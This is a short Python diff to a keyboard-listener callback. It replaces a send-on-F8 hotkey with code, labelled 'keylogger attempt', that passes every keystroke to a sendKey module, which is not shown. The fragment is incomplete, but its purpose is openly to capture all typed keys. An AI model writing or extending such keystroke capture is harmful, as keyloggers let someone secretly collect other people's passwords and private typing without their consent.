@@ -10,11 +10,15 @@ import sendKey
 
 def on_press(key):
 
+
     # formats key pressed
     key_pressed = '{0}'.format(key)
-    # sends a message
-    if key_pressed == "Key.f8":
-        sendKey.key_press()
+    ### sends a message upon pressing F8
+    # if key_pressed == "Key.f8":
+    #     sendKey.key_press()
+
+    ### keylogger attempt
+    sendKey.key_press(key)
 
     # ends the listener
     if key_pressed == "Key.f9":
